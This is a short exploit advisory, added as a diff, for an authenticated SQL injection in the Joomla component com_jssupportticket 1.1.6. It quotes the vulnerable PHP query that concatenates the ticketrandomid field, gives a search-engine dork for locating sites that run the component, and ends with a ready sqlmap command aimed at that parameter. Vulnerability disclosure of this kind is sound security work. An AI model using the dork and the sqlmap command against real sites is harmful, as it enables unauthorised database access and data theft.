@@ -1,0 +1,33 @@
+#Exploit Title: Joomla! component com_jssupportticket - Authenticated SQL Injection
+#Dork: inurl:"index.php?option=com_jssupportticket"
+#Date: 10.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://www.joomsky.com/
+#Software Link: https://www.joomsky.com/46/download/1.html
+#Version: 1.1.6
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+Vulnerable code is in line 31 in file admin/models/ticketreply.php
+	
+	...snip...
+    24	    function storeTicketReplies($ticketid, $message, $created, $data2) {
+    25	        if (!is_numeric($ticketid))
+    26	            return false;
+    27	
+    28	        //validate reply for break down
+    29	        $ticketrandomid   = $data2['ticketrandomid'];		//!!!
+    30	        $db = $this->getDBo();
+    31	        $query = "SELECT id FROM `#__js_ticket_tickets` WHERE ticketid='$ticketrandomid'";	//!!!
+    32	        $db->setQuery($query);
+    33	        $res = $db->loadResult();
+    34	        if($res != $ticketid){
+    35	            return false;
+    36	        }//end
+    ...snip...
+
+#####################################
+#PoC:
+#####################################
+$> sqlmap.py -u "http://localhost/index.php" --random-agent --dbms=mysql --method POST --data 'option=com_jssupportticket&c=ticket&task=actionticket&Itemid=666&ticketid=666&callfrom=savemessage&message=woot&created=woot&ticketrandomid=woot&{VALID_FORMTOKEN_FROM_TICKETDETAIL}=1' -p ticketrandomid --cookie 'VALID_SESSION_ID=VALID_SESSION_ID'
